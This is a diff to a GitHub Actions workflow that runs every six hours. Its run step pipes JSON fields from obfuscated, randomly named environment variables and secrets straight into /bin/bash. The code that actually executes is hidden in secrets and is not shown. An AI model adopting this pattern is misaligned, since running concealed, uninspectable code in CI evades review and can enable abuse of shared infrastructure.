@@ -3,30 +3,33 @@ name: zhangshun19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 0/6 * * *'
+    - cron: '51 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhangshun19871010
         env:
-          lov376: ${{ secrets.lov376 }}
+          ej81: ${{ secrets.ej81 }}
         run: |
-          echo $lov376 | jq -r .hahpu500 | /bin/bash
-          echo $lzrj6068 | jq -r .bdfyb3089 | /bin/bash
-          echo $ho92693 | jq -r .tlp4294 | /bin/bash
-          echo $k22849 | jq -r .gmp6 | /bin/bash
-          echo $yvvz999 | jq -r .kny9205 | /bin/bash
-          echo $oab6 | jq -r .d97795 | /bin/bash
-          echo $sj7 | jq -r .kjw5 | /bin/bash
-          echo $ggd701 | jq -r .enp22 | /bin/bash
-          echo $xnfyh04976 | jq -r .xd71855 | /bin/bash
-          echo $cqtyb1193 | jq -r .u54 | /bin/bash
-          echo $l902 | jq -r .gl1 | /bin/bash
-          echo $o1 | jq -r .eril5464 | /bin/bash
-          echo $cxmv19 | jq -r .is7 | /bin/bash
-          echo $hq55 | jq -r .hu5849 | /bin/bash
+          echo $ej81 | jq -r .ux1757 | /bin/bash
+          echo $bipu964 | jq -r .wmaf11876 | /bin/bash
+          echo $nbb1 | jq -r .n8427 | /bin/bash
+          echo $er32 | jq -r .h05690 | /bin/bash
+          echo $dtu0249 | jq -r .l5265 | /bin/bash
+          echo $rz37 | jq -r .gpxii0 | /bin/bash
+          echo $bmfx43 | jq -r .hha43116 | /bin/bash
+          echo $c130 | jq -r .o76293 | /bin/bash
+          echo $lo12 | jq -r .rionh7 | /bin/bash
+          echo $bkhxo39 | jq -r .gqhff54 | /bin/bash
+          echo $cx15 | jq -r .hpo488 | /bin/bash
+          echo $o75923 | jq -r .in786 | /bin/bash
+          echo $kcc937 | jq -r .mkm5 | /bin/bash
+          echo $h71547 | jq -r .cc66490 | /bin/bash
+          echo $g8024 | jq -r .gnznc4962 | /bin/bash
+          echo $u04 | jq -r .qrvk88971 | /bin/bash
+          echo $irdgn752 | jq -r .ppfj8002 | /bin/bash
+          echo $fa9967 | jq -r .klv135 | /bin/bash
 
